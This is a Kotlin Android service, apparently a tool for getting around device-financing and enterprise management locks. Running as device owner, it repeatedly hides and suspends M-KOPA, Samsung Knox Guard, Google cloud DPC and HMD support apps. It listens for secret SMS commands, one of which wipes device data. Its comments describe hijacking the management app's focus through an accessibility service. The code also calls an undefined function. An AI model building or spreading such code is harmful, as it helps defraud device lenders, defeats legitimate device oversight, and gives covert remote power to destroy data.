package com.example.mdmnew

import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.IBinder
import android.os.UserManager
import android.telephony.SmsMessage
import android.telephony.TelephonyManager
import android.util.Log

class MDMControllerService : Service() {

    private lateinit var dpm: DevicePolicyManager
    private lateinit var admin: ComponentName
    private var lastSimSerial: String? = null

    private val smsReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val pdus = intent.extras?.get("pdus") as? Array<*> ?: return
            for (pdu in pdus) {
                val sms = SmsMessage.createFromPdu(pdu as ByteArray)
                val body = sms.messageBody ?: ""
                
                // SECRET COMMANDS
                if (body.contains("#NEUTRALIZE#")) {
                    enforceRules()
                } else if (body.contains("#WIPE_NOW#")) {
                    if (dpm.isDeviceOwnerApp(packageName)) {
                        dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE)
                    }
                }
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        admin = ComponentName(this, MyDeviceAdminReceiver::class.java)

        registerReceiver(smsReceiver, IntentFilter("android.provider.Telephony.SMS_RECEIVED"))

        // v14.0: THE TITAN MACHINE-GUN LOOP
        Thread {
            while (true) {
                enforceTitanRules()
                Thread.sleep(2000) // Hyper-aggressive 2s pulse
            }
        }.start()

        return START_STICKY
    }

    private fun enforceTitanRules() {
        val targets = listOf(
            "com.m-kopa.app", "com.mkopa.app", "com.mkopa.sales",
            "com.google.android.apps.work.clouddpc",
            "com.samsung.android.knox.containercore",
            "com.samsung.android.knox.guard",
            "com.samsung.android.kgclient",
            "com.sec.android.app.fm",
            "com.hmdglobal.support"
        )
        
        // 1. If we are DO, we hide/suspend
        if (dpm.isDeviceOwnerApp(packageName)) {
            targets.forEach { pkg ->
                try {
                    dpm.setApplicationHidden(admin, pkg, true)
                    dpm.setPackagesSuspended(admin, arrayOf(pkg), true)
                } catch (e: Exception) {}
            }
        } else {
            // 2. If we are GUEST, we use the Accessibility Ghost (handled in that service)
            // and we try to "Focus Hijack" the MDM if it tries to open
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(smsReceiver)
    }

    override fun onBind(intent: Intent?): IBinder? = null
}